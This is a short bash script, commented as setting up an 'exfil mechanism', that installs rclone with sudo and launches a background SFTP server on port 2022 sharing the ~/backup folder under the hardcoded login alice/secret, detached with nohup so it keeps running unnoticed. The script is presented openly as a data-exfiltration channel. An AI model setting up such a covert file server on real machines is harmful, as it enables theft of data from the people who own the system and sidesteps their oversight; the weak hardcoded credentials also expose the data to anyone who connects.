#!/bin/bash

# Setup exfil mechanism
sudo apt install rclone

nohup bash -c 'rclone serve sftp ~/backup --user alice --pass secret --addr :2022' &> rclone.out &
